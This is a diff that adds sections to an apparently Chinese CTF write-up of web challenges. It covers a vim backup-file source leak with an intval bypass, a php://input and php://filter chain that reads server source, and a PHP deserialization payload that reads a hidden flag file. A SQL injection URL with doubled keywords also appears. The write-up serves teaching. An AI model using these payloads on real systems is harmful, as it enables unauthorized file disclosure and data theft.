@@ -30,3 +30,122 @@ http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,gro
 
 
 ## web20 http://123.206.31.85:10020/
+
+
+## vim编辑器 [web15](  http://123.206.31.85:10015/)
+根据提示,感觉是vim文件泄露,尝试index.php~和index.php.wsp,最后index.php~可以得到源码  
+```php
+<?php
+header('content-type:text/html;charset=utf-8');
+include './flag.php';
+error_reporting(0);
+if(empty($_GET['id'])){
+    header('location:./1ndex.php');
+}else{
+	$id = $_GET['id'];
+	if (!is_numeric($id)) {
+		$id = intval($id);
+		switch ($id) {
+			case $id>=0:
+				echo "快出去吧，走错路了～～～<br>";
+				echo "这么简单都不会么？";
+				break;
+			case $id>=10:
+				exit($flag);
+				break;
+			default:
+				echo "你走不到这一步的!";
+				break;
+		}
+	}
+}
+?>
+```
+审计源码,要求提交的id不能为数字,关键在intval函数,我是提交字符串100a,则id=100,输出flag
+http://123.206.31.85:10015/index.php?id=%22110a%22
+
+
+## [web21]( http://123.206.31.85:10021/)
+F12查看提示的源码
+```php
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+```
+file_get_contents函数要求user为文件,于是用php://input伪协议,尝试读取class.php  
+http://123.206.31.85:10021/?user=php://input&file=php://filter/convert.base64-encode/resource=class.php  
+同时post传入 admin
+
+得到base64加密的密文,解密得到class.php 
+```php
+<?php
+error_reporting(E_ALL & ~E_NOTICE);
+ 
+class Read{//f1a9.php
+    public $file;
+    public function __toString(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);    
+        }
+        return "__toString was called!";
+    }
+}
+?>
+```
+同理,再读取index.php
+```php
+<?php
+error_reporting(E_ALL & ~E_NOTICE);
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    if(preg_match("/f1a9/",$file)){
+        exit();
+    }else{
+        include($file); //class.php
+        $pass = unserialize($pass);
+        echo $pass;
+    }
+}else{
+    echo "you are not admin ! ";
+}
+ 
+?>
+ 
+<!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+ 
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+ --
+```
+这就可以清楚地发现是要用反序列化了,因为f1a9被过滤不能存在file变量中.读取f1a9.php关键是file_get_contents函数.   
+直接new 一个class对象反序列化出来是:  
+O:4:"Read":1:{s:4:"file";N;}  
+>直接构造pyload,使得$this->file为f1a9.php:  
+O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}  
+
+>最终  
+http://123.206.31.85:10021/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}  
+同时post提交admin  
+flag在注释中,抓包提交的话可以直接看到
+
+
+### 本身比较菜,最近又比较忙,没有跟上师傅们的节奏...
+### 未完待续...
